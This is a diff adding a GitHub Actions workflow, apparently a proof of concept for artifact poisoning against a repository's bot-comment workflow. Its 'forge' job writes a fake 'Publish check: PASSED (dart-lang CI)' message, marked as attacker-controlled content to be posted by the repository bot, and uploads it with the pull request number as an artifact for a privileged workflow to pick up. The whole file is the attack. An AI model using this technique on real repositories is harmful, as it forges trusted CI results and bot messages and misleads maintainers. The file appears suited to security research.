@@ -1,0 +1,22 @@
+name: Health
+on:
+  pull_request:
+    branches: [ main ]
+permissions:
+  contents: read
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft output artifact
+        run: |
+          printf '## Publish check: PASSED (dart-lang CI)\n\nATTACKER-CONTROLLED CONTENT POSTED BY THE REPOSITORY BOT.\n' > comment.md
+          echo "${{ github.event.pull_request.number }}" > issueNumber
+          cat comment.md
+          cat issueNumber
+      - uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: |
+            comment.md
+            issueNumber
